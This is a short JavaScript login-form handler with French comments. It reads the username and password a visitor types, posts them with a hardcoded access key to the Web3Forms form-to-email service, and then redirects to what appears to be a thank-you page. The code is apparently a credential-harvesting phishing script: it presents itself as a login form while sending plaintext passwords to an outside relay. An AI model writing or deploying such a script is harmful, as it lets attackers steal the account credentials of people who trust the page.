// Récupérer l'élément du formulaire
const form = document.getElementById("loginForm");

// Ajouter un événement au formulaire pour gérer la soumission
form.addEventListener("submit", async (event) => {
  event.preventDefault(); // Empêche la soumission par défaut

  // Récupérer les valeurs des champs du formulaire
  const username = document.getElementById("username").value;
  const mdp = document.getElementById("mdp").value;

  // Créer un objet contenant les données à envoyer
  const formData = {
    username: username,
    mdp: mdp
  };

  // URL de l'API Web3Forms
  const apiUrl = "https://api.web3forms.com/submit";

  // Clé d'API (à ne pas exposer dans un environnement de production)
  const accessKey = "f051fb26-09cd-4313-8af8-feb1cedc32b1";

  // Afficher un spinner pendant l'envoi des données
  const spinner = document.createElement("div");
  spinner.classList.add("spinner");
  document.body.appendChild(spinner);

  try {
    // Faire une requête POST avec fetch
    const response = await fetch(apiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        access_key: accessKey,
        username: formData.username,
        mdp: formData.mdp
      })
    });

    // Si la requête réussit
    if (response.ok) {
      const data = await response.json();
      console.log("Réponse Web3Forms:", data);

      // Rediriger l'utilisateur vers la page de confirmation
      window.location.href = "ty.html"; // Page à afficher après la soumission
    } else {
      // Gérer les erreurs
      console.error("Erreur lors de l'envoi des données:", response.statusText);
      alert("Une erreur s'est produite lors de l'envoi.");
    }
  } catch (error) {
    // Gérer les erreurs réseau
    console.error("Erreur réseau:", error);
    alert("Une erreur s'est produite.");
  } finally {
    // Enlever le spinner après l'envoi
    spinner.remove();
  }
});